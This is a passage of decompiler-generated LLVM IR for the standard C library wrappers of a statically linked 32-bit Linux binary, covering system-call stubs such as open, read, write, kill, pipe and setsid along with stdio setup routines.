  %v3_804df54 = call i32 @ioctl(i32 %v0_804df4c, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804df4c, i32* @ebx, align 4
  store i32 %v3_804df54, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804df54, -4095
  br i1 %tmp11, label %dec_label_pc_804df6c, label %dec_label_pc_804df60

dec_label_pc_804df60:                             ; preds = %entry
  %v1_804df60 = call i32 @__errno_location(i32 %v0_804df4c)
  %v0_804df65 = load i32, i32* %edi.global-to-local, align 4
  %v1_804df65 = sub i32 0, %v0_804df65
  %v2_804df67 = inttoptr i32 %v1_804df60 to i32*
  store i32 %v1_804df65, i32* %v2_804df67, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804df6c

dec_label_pc_804df6c:                             ; preds = %entry, %dec_label_pc_804df60
  %v0_804df6c = phi i32 [ %v3_804df54, %entry ], [ -1, %dec_label_pc_804df60 ]
  %v2_804df71 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df71, i32* @edi, align 4
  ret i32 %v0_804df6c

; uselistorder directives
  uselistorder i32 %v3_804df54, { 1, 0, 2 }
  uselistorder i32 %v0_804df4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df6c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df74 = load i32, i32* @ebx, align 4
  store i32 %v0_804df74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804df87 = call i32 @kill(i32 %v0_804df74, i32 %tmp4)
  store i32 %v2_804df87, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804df87, -4095
  br i1 %tmp8, label %dec_label_pc_804dfa0, label %dec_label_pc_804df94

dec_label_pc_804df94:                             ; preds = %entry
  %v0_804df94 = load i32, i32* %stack_var_-4, align 4
  %v1_804df94 = call i32 @__errno_location(i32 %v0_804df94)
  %v0_804df99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df99 = sub i32 0, %v0_804df99
  %v2_804df9b = inttoptr i32 %v1_804df94 to i32*
  store i32 %v1_804df99, i32* %v2_804df9b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfa0

dec_label_pc_804dfa0:                             ; preds = %entry, %dec_label_pc_804df94
  %v0_804dfa0 = phi i32 [ %v2_804df87, %entry ], [ -1, %dec_label_pc_804df94 ]
  %v2_804dfa2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfa2, i32* @edx, align 4
  %v2_804dfa4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dfa4, i32* @ebx, align 4
  ret i32 %v0_804dfa0

; uselistorder directives
  uselistorder i32 %v2_804df87, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dfa0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dfa9 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804dfaf = sdiv i32 %sext, 16777216
  %v4_804dfb3 = ptrtoint i8* %arg1 to i32
  %v3_804dfb7 = and i32 %arg2, 64
  %v4_804dfb7 = icmp eq i32 %v3_804dfb7, 0
  br i1 %v4_804dfb7, label %dec_label_pc_804dfc8, label %dec_label_pc_804dfbc

dec_label_pc_804dfbc:                             ; preds = %entry
  br label %dec_label_pc_804dfc8

dec_label_pc_804dfc8:                             ; preds = %entry, %dec_label_pc_804dfbc
  store i32 %v4_804dfb3, i32* %ebx.global-to-local, align 4
  %v5_804dfd3 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804dfaf)
  store i32 %v5_804dfd3, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804dfd3, -4095
  br i1 %tmp15, label %dec_label_pc_804dfeb, label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfc8
  %v1_804dfdf = call i32 @__errno_location(i32 %v0_804dfa9)
  %v0_804dfe4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dfe4 = sub i32 0, %v0_804dfe4
  %v2_804dfe6 = inttoptr i32 %v1_804dfdf to i32*
  store i32 %v1_804dfe4, i32* %v2_804dfe6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dfeb

dec_label_pc_804dfeb:                             ; preds = %dec_label_pc_804dfc8, %dec_label_pc_804dfdf
  %v0_804dfeb = phi i32 [ %v5_804dfd3, %dec_label_pc_804dfc8 ], [ -1, %dec_label_pc_804dfdf ]
  store i32 %v0_804dfa9, i32* @ebx, align 4
  ret i32 %v0_804dfeb

; uselistorder directives
  uselistorder i32 %v5_804dfd3, { 1, 0, 2 }
  uselistorder i32 %v0_804dfa9, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804dfeb, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804e003 = inttoptr i32 %arg1 to i8*
  %v4_804e003 = call i32 @__libc_open(i8* %v3_804e003, i32 577)
  ret i32 %v4_804e003
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e00c = load i32, i32* @edi, align 4
  store i32 %v0_804e00c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e014 = load i32, i32* @ebx, align 4
  %v1_804e01c = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804e01c = call i32 @pipe([2 x i32] %v1_804e01c)
  store i32 %v0_804e014, i32* @ebx, align 4
  store i32 %v2_804e01c, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804e01c, -4095
  br i1 %tmp8, label %dec_label_pc_804e034, label %dec_label_pc_804e028

dec_label_pc_804e028:                             ; preds = %entry
  %v1_804e028 = call i32 @__errno_location(i32 %v0_804e014)
  %v0_804e02d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e02d = sub i32 0, %v0_804e02d
  %v2_804e02f = inttoptr i32 %v1_804e028 to i32*
  store i32 %v1_804e02d, i32* %v2_804e02f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e034

dec_label_pc_804e034:                             ; preds = %entry, %dec_label_pc_804e028
  %v0_804e034 = phi i32 [ %v2_804e01c, %entry ], [ -1, %dec_label_pc_804e028 ]
  %v2_804e038 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e038, i32* @edi, align 4
  ret i32 %v0_804e034

; uselistorder directives
  uselistorder i32 %v2_804e01c, { 1, 0, 2 }
  uselistorder i32 %v0_804e014, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e034, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e03c = load i32, i32* @edi, align 4
  store i32 %v0_804e03c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e04c = load i32, i32* @ebx, align 4
  %v4_804e054 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e04c, i32* @ebx, align 4
  store i32 %v4_804e054, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804e054, -4095
  br i1 %tmp11, label %dec_label_pc_804e06c, label %dec_label_pc_804e060

dec_label_pc_804e060:                             ; preds = %entry
  %v1_804e060 = call i32 @__errno_location(i32 %v0_804e04c)
  %v0_804e065 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e065 = sub i32 0, %v0_804e065
  %v2_804e067 = inttoptr i32 %v1_804e060 to i32*
  store i32 %v1_804e065, i32* %v2_804e067, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e06c

dec_label_pc_804e06c:                             ; preds = %entry, %dec_label_pc_804e060
  %v0_804e06c = phi i32 [ %v4_804e054, %entry ], [ -1, %dec_label_pc_804e060 ]
  %v2_804e070 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e070, i32* @edi, align 4
  ret i32 %v0_804e06c

; uselistorder directives
  uselistorder i32 %v4_804e054, { 1, 0, 2 }
  uselistorder i32 %v0_804e04c, { 1, 0 }
  uselistorder label %dec_label_pc_804e06c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e075 = load i32, i32* @esi, align 4
  store i32 %v0_804e075, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804e08d = load i32, i32* @ebx, align 4
  %v1_804e095 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804e08d, i32* @ebx, align 4
  store i32 %v1_804e095, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804e095, -4095
  br i1 %tmp11, label %dec_label_pc_804e0ad, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %entry
  %v1_804e0a1 = call i32 @__errno_location(i32 %v0_804e08d)
  %v0_804e0a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e0a6 = sub i32 0, %v0_804e0a6
  %v2_804e0a8 = inttoptr i32 %v1_804e0a1 to i32*
  store i32 %v1_804e0a6, i32* %v2_804e0a8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e0ad

dec_label_pc_804e0ad:                             ; preds = %entry, %dec_label_pc_804e0a1
  %v0_804e0ad = phi i32 [ %v1_804e095, %entry ], [ -1, %dec_label_pc_804e0a1 ]
  %v2_804e0b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e0b0, i32* @esi, align 4
  ret i32 %v0_804e0ad

; uselistorder directives
  uselistorder i32 %v1_804e095, { 1, 0, 2 }
  uselistorder i32 %v0_804e08d, { 1, 0 }
  uselistorder label %dec_label_pc_804e0ad, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0b4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e0b4, i32* %stack_var_-4, align 4
  %v1_804e0bd = call i32 @setsid(i32 %v0_804e0b4)
  store i32 %v1_804e0bd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804e0bd, -4095
  br i1 %tmp6, label %dec_label_pc_804e0d4, label %dec_label_pc_804e0c8

dec_label_pc_804e0c8:                             ; preds = %entry
  %v0_804e0c8 = load i32, i32* %stack_var_-4, align 4
  %v1_804e0c8 = call i32 @__errno_location(i32 %v0_804e0c8)
  %v0_804e0cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e0cd = sub i32 0, %v0_804e0cd
  %v2_804e0cf = inttoptr i32 %v1_804e0c8 to i32*
  store i32 %v1_804e0cd, i32* %v2_804e0cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e0d4

dec_label_pc_804e0d4:                             ; preds = %entry, %dec_label_pc_804e0c8
  %v0_804e0d4 = phi i32 [ %v1_804e0bd, %entry ], [ -1, %dec_label_pc_804e0c8 ]
  %v2_804e0d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e0d8, i32* @ebx, align 4
  ret i32 %v0_804e0d4

; uselistorder directives
  uselistorder i32 %v1_804e0bd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e0d4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e0dd = load i32, i32* @esi, align 4
  %v4_804e0e1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e0e1, i32* @ecx, align 4
  %v2_804e0ed = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e0ed, label %dec_label_pc_804e106, label %dec_label_pc_804e0f1

dec_label_pc_804e0f1:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804e106, label %dec_label_pc_804e0f6

dec_label_pc_804e0f6:                             ; preds = %dec_label_pc_804e0f1
  %v1_804e0f6 = call i32 @__errno_location(i32 %v0_804e0dd)
  %v1_804e0fb = inttoptr i32 %v1_804e0f6 to i32*
  store i32 22, i32* %v1_804e0fb, align 4
  br label %dec_label_pc_804e12d

dec_label_pc_804e106:                             ; preds = %dec_label_pc_804e0f1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e10b = load i32, i32* @ebx, align 4
  %v7_804e113 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e10b, i32* @ebx, align 4
  store i32 %v7_804e113, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804e113, -4095
  br i1 %tmp12, label %dec_label_pc_804e12d, label %dec_label_pc_804e11f

dec_label_pc_804e11f:                             ; preds = %dec_label_pc_804e106
  %v1_804e11f = call i32 @__errno_location(i32 %v0_804e10b)
  %v0_804e124 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e124 = sub i32 0, %v0_804e124
  %v2_804e126 = inttoptr i32 %v1_804e11f to i32*
  store i32 %v1_804e124, i32* %v2_804e126, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e12d

dec_label_pc_804e12d:                             ; preds = %dec_label_pc_804e11f, %dec_label_pc_804e106, %dec_label_pc_804e0f6
  %storemerge = phi i32 [ -1, %dec_label_pc_804e0f6 ], [ %v7_804e113, %dec_label_pc_804e106 ], [ -1, %dec_label_pc_804e11f ]
  %v2_804e12d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e12d, i32* @edx, align 4
  store i32 %v0_804e0dd, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804e113, { 1, 0, 2 }
  uselistorder i32 %v0_804e10b, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804e134 = load i32, i32* @edi, align 4
  store i32 %v0_804e134, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e13c = load i32, i32* @ebx, align 4
  %v2_804e144 = call i32 @time(i32* %arg1)
  store i32 %v0_804e13c, i32* @ebx, align 4
  store i32 %v2_804e144, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804e144, -4095
  br i1 %tmp9, label %dec_label_pc_804e15c, label %dec_label_pc_804e150

dec_label_pc_804e150:                             ; preds = %entry
  %v1_804e150 = call i32 @__errno_location(i32 %v0_804e13c)
  %v0_804e155 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e155 = sub i32 0, %v0_804e155
  %v2_804e157 = inttoptr i32 %v1_804e150 to i32*
  store i32 %v1_804e155, i32* %v2_804e157, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e15c

dec_label_pc_804e15c:                             ; preds = %entry, %dec_label_pc_804e150
  %v0_804e15c = phi i32 [ %v2_804e144, %entry ], [ -1, %dec_label_pc_804e150 ]
  %v2_804e160 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e160, i32* @edi, align 4
  ret i32 %v0_804e15c

; uselistorder directives
  uselistorder i32 %v2_804e144, { 1, 0, 2 }
  uselistorder i32 %v0_804e13c, { 1, 0 }
  uselistorder label %dec_label_pc_804e15c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804e175 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804e175
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e180 = load i32, i32* @edi, align 4
  store i32 %v0_804e180, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e190 = load i32, i32* @ebx, align 4
  %v4_804e198 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e190, i32* @ebx, align 4
  store i32 %v4_804e198, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804e198, -4095
  br i1 %tmp11, label %dec_label_pc_804e1b0, label %dec_label_pc_804e1a4

dec_label_pc_804e1a4:                             ; preds = %entry
  %v1_804e1a4 = call i32 @__errno_location(i32 %v0_804e190)
  %v0_804e1a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e1a9 = sub i32 0, %v0_804e1a9
  %v2_804e1ab = inttoptr i32 %v1_804e1a4 to i32*
  store i32 %v1_804e1a9, i32* %v2_804e1ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e1b0

dec_label_pc_804e1b0:                             ; preds = %entry, %dec_label_pc_804e1a4
  %v0_804e1b0 = phi i32 [ %v4_804e198, %entry ], [ -1, %dec_label_pc_804e1a4 ]
  %v2_804e1b2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e1b2, i32* @edx, align 4
  %v2_804e1b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e1b4, i32* @edi, align 4
  ret i32 %v0_804e1b0

; uselistorder directives
  uselistorder i32 %v4_804e198, { 1, 0, 2 }
  uselistorder i32 %v0_804e190, { 1, 0 }
  uselistorder label %dec_label_pc_804e1b0, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e1bc = load i32, i32* inttoptr (i32 134566308 to i32*), align 4
  %v2_804e1c1 = mul i32 %arg1, 2
  %v3_804e1c1 = add i32 %v0_804e1bc, %v2_804e1c1
  %v4_804e1c1 = inttoptr i32 %v3_804e1c1 to i16*
  %v5_804e1c1 = load i16, i16* %v4_804e1c1, align 2
  %v6_804e1c1 = zext i16 %v5_804e1c1 to i32
  %v1_804e1c5 = and i32 %v6_804e1c1, 32
  ret i32 %v1_804e1c5
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e1d0 = add i32 %arg1, 128
  %v6_804e1db = icmp ugt i32 %v1_804e1d0, 383
  br i1 %v6_804e1db, label %dec_label_pc_804e1e6, label %dec_label_pc_804e1dd

dec_label_pc_804e1dd:                             ; preds = %entry
  %v0_804e1dd = load i32, i32* inttoptr (i32 134566316 to i32*), align 4
  %v2_804e1e2 = mul i32 %arg1, 2
  %v3_804e1e2 = add i32 %v0_804e1dd, %v2_804e1e2
  %v4_804e1e2 = inttoptr i32 %v3_804e1e2 to i16*
  %v5_804e1e2 = load i16, i16* %v4_804e1e2, align 2
  %v6_804e1e2 = sext i16 %v5_804e1e2 to i32
  store i32 %v6_804e1e2, i32* @edx, align 4
  br label %dec_label_pc_804e1e6

dec_label_pc_804e1e6:                             ; preds = %entry, %dec_label_pc_804e1dd
  %v0_804e1e6 = phi i32 [ %arg1, %entry ], [ %v6_804e1e2, %dec_label_pc_804e1dd ]
  ret i32 %v0_804e1e6

; uselistorder directives
  uselistorder label %dec_label_pc_804e1e6, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805b494.97 to i32)
}

define i32 @puts(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804e1f4 = load i32, i32* @edi, align 4
  %v0_804e1f5 = load i32, i32* @esi, align 4
  %v0_804e1f6 = load i32, i32* @ebx, align 4
  %v12_804e1f7 = ptrtoint i32* %stack_var_-28 to i32
  %v0_804e1fa = load i32, i32* inttoptr (i32 134566324 to i32*), align 4
  store i32 %v0_804e1fa, i32* @esi, align 4
  %v1_804e200 = add i32 %v0_804e1fa, 52
  %v2_804e200 = inttoptr i32 %v1_804e200 to i32*
  %v3_804e200 = load i32, i32* %v2_804e200, align 4
  store i32 %v3_804e200, i32* @edi, align 4
  %v1_804e203 = icmp eq i32 %v3_804e200, 0
  %v1_804e205 = icmp eq i1 %v1_804e203, false
  br i1 %v1_804e205, label %entry.dec_label_pc_804e226_crit_edge, label %dec_label_pc_804e207

entry.dec_label_pc_804e226_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804e226

dec_label_pc_804e207:                             ; preds = %entry
  %v1_804e207 = add i32 %v0_804e1fa, 56
  store i32 %v1_804e207, i32* @ebx, align 4
  store i32 %v12_804e1f7, i32* @eax, align 4
  %v2_804e216 = call i32 @__pthread_return_void(i32 %v12_804e1f7, i32 134548959)
  %v0_804e21b = load i32, i32* @ebx, align 4
  %v1_804e21e = call i32 @__pthread_return_0(i32 %v0_804e21b)
  %v0_804e228.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e226

dec_label_pc_804e226:                             ; preds = %entry.dec_label_pc_804e226_crit_edge, %dec_label_pc_804e207
  %v0_804e228 = phi i32 [ %v0_804e1fa, %entry.dec_label_pc_804e226_crit_edge ], [ %v0_804e228.pre, %dec_label_pc_804e207 ]
  %v0_804e226 = load i32, i32* @ecx, align 4
  %v4_804e22d = inttoptr i32 %arg1 to i8*
  %v5_804e22d = call i32 @__GI_fputs_unlocked(i8* %v4_804e22d, i32 %v0_804e228, i32 %v0_804e226, i32 %v0_804e226)
  store i32 %v5_804e22d, i32* @ebx, align 4
  %v10_804e237 = icmp eq i32 %v5_804e22d, -1
  br i1 %v10_804e237, label %dec_label_pc_804e252, label %dec_label_pc_804e23c

dec_label_pc_804e23c:                             ; preds = %dec_label_pc_804e226
  %v0_804e23c = load i32, i32* @edx, align 4
  %v0_804e23e = load i32, i32* @esi, align 4
  %v5_804e241 = call i32 @putc_unlocked(i8 10, i32 %v0_804e23e, i32 %v0_804e23c, i32 %v0_804e23c)
  %v8_804e249 = icmp eq i32 %v5_804e241, -1
  %v1_804e24a = icmp eq i1 %v8_804e249, false
  br i1 %v1_804e24a, label %dec_label_pc_804e251, label %dec_label_pc_804e24c

dec_label_pc_804e24c:                             ; preds = %dec_label_pc_804e23c
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_804e252

dec_label_pc_804e251:                             ; preds = %dec_label_pc_804e23c
  %v0_804e251 = load i32, i32* @ebx, align 4
  %v1_804e251 = add i32 %v0_804e251, 1
  store i32 %v1_804e251, i32* @ebx, align 4
  br label %dec_label_pc_804e252

dec_label_pc_804e252:                             ; preds = %dec_label_pc_804e226, %dec_label_pc_804e24c, %dec_label_pc_804e251
  %v0_804e26a6 = phi i32 [ -1, %dec_label_pc_804e226 ], [ -1, %dec_label_pc_804e24c ], [ %v1_804e251, %dec_label_pc_804e251 ]
  br i1 %v1_804e205, label %dec_label_pc_804e267, label %dec_label_pc_804e256

dec_label_pc_804e256:                             ; preds = %dec_label_pc_804e252
  store i32 %v12_804e1f7, i32* @eax, align 4
  %v2_804e25f = call i32 @__pthread_return_void(i32 %v12_804e1f7, i32 1)
  %v0_804e26a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e267

dec_label_pc_804e267:                             ; preds = %dec_label_pc_804e252, %dec_label_pc_804e256
  %v0_804e26a = phi i32 [ %v0_804e26a6, %dec_label_pc_804e252 ], [ %v0_804e26a.pre, %dec_label_pc_804e256 ]
  store i32 %v0_804e1f6, i32* @ebx, align 4
  store i32 %v0_804e1f5, i32* @esi, align 4
  store i32 %v0_804e1f4, i32* @edi, align 4
  ret i32 %v0_804e26a

; uselistorder directives
  uselistorder i32 %v12_804e1f7, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e267, { 1, 0 }
  uselistorder label %dec_label_pc_804e252, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e226, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e291 = load i32, i32* @edi, align 4
  %v0_804e292 = load i32, i32* @esi, align 4
  %v0_804e293 = load i32, i32* @ebx, align 4
  store i32 %v0_804e293, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e29c = call i32 @__errno_location(i32 %v0_804e293)
  store i32 %v1_804e29c, i32* @edi, align 4
  %v0_804e2a6 = load i32, i32* @global_var_8055200.94, align 512
  store i32 %v0_804e2a6, i32* @esi, align 4
  %v1_804e2ac = inttoptr i32 %v1_804e29c to i32*
  %v2_804e2ac = load i32, i32* %v1_804e2ac, align 4
  store i32 %v2_804e2ac, i32* %ebp.global-to-local, align 4
  %v1_804e2b0 = call i32 @isatty(i32 0)
  %v0_804e2b5 = load i32, i32* @ebx, align 4
  %v2_804e2b7 = sub i32 %v0_804e2b5, %v1_804e2b0
  %v2_804e2c2 = mul i32 %v2_804e2b7, 256
  %v0_804e2c5 = load i32, i32* @esi, align 4
  %v2_804e2c5 = xor i32 %v0_804e2c5, %v2_804e2c2
  %v1_804e2c7 = trunc i32 %v2_804e2c5 to i16
  store i16 %v1_804e2c7, i16* bitcast (i32* @global_var_8055200.94 to i16*), align 512
  %v0_804e2ce = load i32, i32* @global_var_8055250.95, align 16
  store i32 %v0_804e2ce, i32* @esi, align 4
  %v1_804e2d4 = call i32 @isatty(i32 1)
  %v0_804e2d9 = load i32, i32* @ebx, align 4
  %v2_804e2d9 = sub i32 %v0_804e2d9, %v1_804e2d4
  %v2_804e2db = mul i32 %v2_804e2d9, 256
  %v0_804e2de = load i32, i32* @esi, align 4
  %v2_804e2de = xor i32 %v2_804e2db, %v0_804e2de
  %v1_804e2e0 = trunc i32 %v2_804e2de to i16
  store i16 %v1_804e2e0, i16* bitcast (i32* @global_var_8055250.95 to i16*), align 16
  %v0_804e2e7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e2e7 = load i32, i32* @edi, align 4
  %v2_804e2e7 = inttoptr i32 %v1_804e2e7 to i32*
  store i32 %v0_804e2e7, i32* %v2_804e2e7, align 4
  %v2_804e2ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e2ec, i32* @ebx, align 4
  store i32 %v0_804e292, i32* @esi, align 4
  store i32 %v0_804e291, i32* @edi, align 4
  ret i32 %v1_804e2d4

; uselistorder directives
  uselistorder i32 %v1_804e29c, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e2ff = inttoptr i32 %arg1 to i16*
  %v4_804e2ff = call i32 @memcpy(i16* %v3_804e2ff, i32 ptrtoint (i32* @global_var_8053160.98 to i32), i32 24)
  ret i32 %v4_804e2ff
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e308 = load i32, i32* @esi, align 4
  %v0_804e309 = load i32, i32* @ebx, align 4
  store i32 %v0_804e309, i32* %stack_var_-8, align 4
  %v1_804e312 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80551c8.99 to i32))
  store i32 %v1_804e312, i32* %eax.global-to-local, align 4
  %v1_804e31e = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80551e0.100 to i32))
  store i32 %v1_804e31e, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80551c4.101 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e36822 = icmp eq i32 %storemerge21, 0
  %v1_804e36a23 = icmp eq i1 %v1_804e36822, false
  br i1 %v1_804e36a23, label %dec_label_pc_804e32b.lr.ph, label %dec_label_pc_804e388.preheader

dec_label_pc_804e32b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e32b

dec_label_pc_804e32b:                             ; preds = %dec_label_pc_804e32b.lr.ph, %dec_label_pc_804e352
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804e32b.lr.ph ], [ %storemerge, %dec_label_pc_804e352 ]
  %v1_804e32e = add i32 %storemerge24, 56
  store i32 %v1_804e32e, i32* @esi, align 4
  %v1_804e332 = call i32 @__pthread_return_0(i32 %v1_804e32e)
